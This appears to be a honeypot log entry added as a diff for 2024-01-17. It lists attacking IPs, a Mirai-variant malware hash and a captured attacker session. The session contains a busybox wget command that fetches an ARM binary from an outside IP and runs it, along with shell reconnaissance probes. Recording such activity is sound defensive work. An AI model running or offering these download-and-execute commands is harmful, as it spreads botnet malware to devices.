@@ -1,0 +1,95 @@
+Top 5 IPs for 2024-01-17:
+
+157.245.58.99
+79.137.203.162
+104.152.52.199
+220.117.3.198
+134.122.10.215
+
+Malware download: 
+94bf68734989a85a3eeb1f390cb1bb33c1c5059a2b9feef9161fbb03fdb36d0e
+https://www.virustotal.com/gui/file/94bf68734989a85a3eeb1f390cb1bb33c1c5059a2b9feef9161fbb03fdb36d0e
+Relatively less detection (Mirai varient)
+
+Malicious commands seen:
+killall -9 arm7; killall -9 arm; killall -9 arm4; cd /data/local/tmp/; busybox wget http://89.190.156.211/arm7; chmod 777 arm7; ./arm7 android
+
+enable compgen
+enable complete
+enable continue
+enable declare
+enable dirs
+enable disown
+enable echo
+enable enable
+enable eval
+enable exec
+enable exit
+enable export
+enable false
+enable fc
+enable fg
+enable getopts
+enable hash
+enable help
+enable history
+enable jobs
+enable kill
+enable let
+enable local
+enable logout
+enable popd
+enable printf
+enable pushd
+enable pwd
+enable read
+enable readonly
+enable return
+enable set
+enable shift
+enable shopt
+enable source
+enable suspend
+enable test
+enable times
+enable trap
+enable true
+enable type
+enable typeset
+enable ulimit
+enable umask
+enable unalias
+enable unset
+enable wait
+system
+-bash: system: command not found
+shell
+-bash: shell: command not found
+sh
+cat /proc/mounts; /bin/busybox NXYXS
+.[4lrootfs / rootfs rw 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=10240k,nr_inodes=997843,mode=755 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
+tmpfs /run tmpfs rw,nosuid,relatime,size=1613336k,mode=755 0 0
+/dev/dm-0 / ext3 rw,relatime,errors=remount-ro,data=ordered 0 0
+tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0
+tmpfs /run/lock tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct 0 0
+fusectl /sys/fs/fuse/connections fusectl rw,relatime 0 0
+/dev/sda1 /boot ext2 rw,relatime 0 0
+/dev/mapper/home /home ext3 rw,relatime,data=ordered 0 0
+binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc rw,relatime 0 0
+.[4h.[4lNXYXS: applet not found
+ cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NXYXS
+.[4l.[4h.[4lcat: .s: No such file or directory
+.[4h.[4l.[4h.[4lNXYXS: applet not found
+ tftp; wget; /bin/busybox NXYXS
+.[4lusage: tftp [-h] [-c C C] [-l L] [-g G] [-p P] [-r R] [hostname]
+.[4h.[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+.[4h.[4lNXYXS: applet not found
+/dev/shm$
